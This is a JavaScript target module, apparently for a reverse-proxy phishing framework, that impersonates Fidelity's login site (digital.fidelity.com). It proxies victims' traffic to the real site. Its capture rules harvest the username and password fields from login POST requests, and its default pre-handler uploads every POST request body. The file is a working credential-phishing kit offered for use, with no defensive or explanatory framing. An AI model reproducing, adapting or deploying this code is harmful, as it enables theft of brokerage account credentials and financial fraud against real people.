/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = []
    }


    processResponse() {
        return super.processResponse()
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            clientContext.setLogAvailable(true)
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }
        
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}


const configExport = {
    CURRENT_DOMAIN: 'digital.fidelity.com',

    START_PATH: '/prgw/digital/login/full-page?AuthRedUrl=https://oltx.fidelity.com/ftgw/fbc/ofsummary/defaultPage',
    
    EXTERNAL_FILTERS: 
    [
        
    ],

    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['digital.fidelity.com'],
        },
        loginPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['digital.fidelity.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport